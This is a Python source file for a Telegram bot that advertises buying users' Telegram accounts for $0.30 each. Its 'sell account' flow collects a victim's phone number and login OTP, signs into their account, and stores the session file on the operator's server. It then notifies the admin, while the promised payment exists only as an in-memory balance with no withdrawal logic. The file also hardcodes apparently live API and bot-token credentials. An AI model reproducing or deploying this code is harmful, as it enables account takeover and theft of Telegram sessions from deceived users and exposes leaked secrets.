import os
import asyncio
from flask import Flask
from threading import Thread
from telethon import TelegramClient, events, Button
from telethon.tl.functions.channels import GetParticipantRequest
from telethon.errors import UserNotParticipantError

# ============ CONFIGURATION ============
API_ID = 37663020 
API_HASH = 'e082fa08c56c6f30e2855fbec3d2969b'
BOT_TOKEN = '8569155953:AAGWVZ1m3h4ezGZUCEFmt-w0m5-7SEJtQow' 
ADMIN_ID = 7408644813 
CHANNEL_USERNAME = 'PBC_COMMUNITY' 

SESSIONS_DIR = 'sessions'
if not os.path.exists(SESSIONS_DIR):
    os.makedirs(SESSIONS_DIR)

user_data = {}

# Flask Server
app = Flask(__name__)
@app.route('/')
def home(): return "Bot is Online and Ready"

def run_flask():
    port = int(os.environ.get("PORT", 8080))
    app.run(host='0.0.0.0', port=port)

# ============ BOT CLIENT ============
loop = asyncio.new_event_loop()
asyncio.set_event_loop(loop)
bot = TelegramClient('bot_session', API_ID, API_HASH, loop=loop).start(bot_token=BOT_TOKEN)

async def is_subscribed(user_id):
    try:
        await bot(GetParticipantRequest(CHANNEL_USERNAME, user_id))
        return True
    except (UserNotParticipantError, Exception):
        return False

@bot.on(events.NewMessage(pattern='/start'))
async def start(event):
    user_id = event.sender_id
    if not await is_subscribed(user_id):
        buttons = [[Button.url("Join Channel", f"https://t.me/{CHANNEL_USERNAME}")],
                   [Button.inline("✅ Joined", b"check_join")]]
        await event.respond("👋 Welcome! To use this bot, you must join our channel first.", buttons=buttons)
    else:
        await send_main_menu(event)

@bot.on(events.CallbackQuery(data=b"check_join"))
async def check_join(event):
    if await is_subscribed(event.sender_id):
        await send_main_menu(event)
    else:
        await event.answer("⚠️ You haven't joined yet!", alert=True)

async def send_main_menu(event):
    buttons = [
        [Button.inline("👤 Account", b"acc_info"), Button.inline("💳 Withdrawal", b"withdraw")],
        [Button.inline("📲 Sell Account", b"sell_acc")],
        [Button.inline("ℹ️ About Bot", b"about")]
    ]
    text = "🏠 **Main Menu**\nChoose an option from below:"
    if hasattr(event, 'edit'): await event.edit(text, buttons=buttons)
    else: await event.respond(text, buttons=buttons)

# ============ IMPROVED SELL ACCOUNT LOGIC ============
@bot.on(events.CallbackQuery(data=b"sell_acc"))
async def sell_account(event):
    user_id = event.sender_id
    async with bot.conversation(user_id, timeout=300) as conv:
        try:
            await conv.send_message("📲 **Please send your phone number with country code (e.g., +880...):**")
            phone_response = await conv.get_response()
            phone = phone_response.text.strip().replace(" ", "")
            
            await conv.send_message("⏳ *Connecting to Telegram... Please wait.*")
            
            # Create a temporary client for the user
            temp_client = TelegramClient(f'{SESSIONS_DIR}/{phone}', API_ID, API_HASH, loop=loop)
            await temp_client.connect()
            
            # Request OTP
            send_code = await temp_client.send_code_request(phone)
            
            await conv.send_message("🔢 **Enter the 5-digit OTP code sent to your Telegram app:**")
            otp_response = await conv.get_response()
            otp = otp_response.text.strip()
            
            # Signing in
            await temp_client.sign_in(phone, otp, phone_code_hash=send_code.phone_code_hash)
            
            # Adding Balance
            if user_id not in user_data: user_data[user_id] = {'balance': 0.0}
            user_data[user_id]['balance'] += 0.30
            
            # Success Message (Same as your old version)
            await conv.send_message(f"✅ **Account Added Successfully:**\n`{phone}`\n💰 0.30$ added to your balance.")
            
            # Admin Alert
            await bot.send_message(ADMIN_ID, f"🚀 **New Account Linked!**\nPhone: `{phone}`\nUser: `{user_id}`")
            
            await temp_client.disconnect()
            
        except Exception as e:
            await conv.send_message(f"❌ **Error:** {str(e)}\n*Please try again correctly.*")

@bot.on(events.CallbackQuery)
async def others(event):
    user_id = event.sender_id
    if user_id not in user_data: user_data[user_id] = {'balance': 0.0}
    
    if event.data == b"acc_info":
        bal = user_data[user_id]['balance']
        await event.edit(f"👤 **Your Account Info**\n\nUser ID: `{user_id}`\nBalance: `{bal:.2f}$` USDT", buttons=[Button.inline("⬅️ Back", b"main_menu")])
    elif event.data == b"about":
        await event.edit("ℹ️ **About Bot**\nThis bot buys Telegram sessions.\n\nCreated By: @ToxicNexo", buttons=[Button.inline("⬅️ Back", b"main_menu")])
    elif event.data == b"main_menu":
        await send_main_menu(event)

if __name__ == '__main__':
    t = Thread(target=run_flask)
    t.daemon = True
    t.start()
    print("Bot is Starting...")
    bot.run_until_disconnected()
    
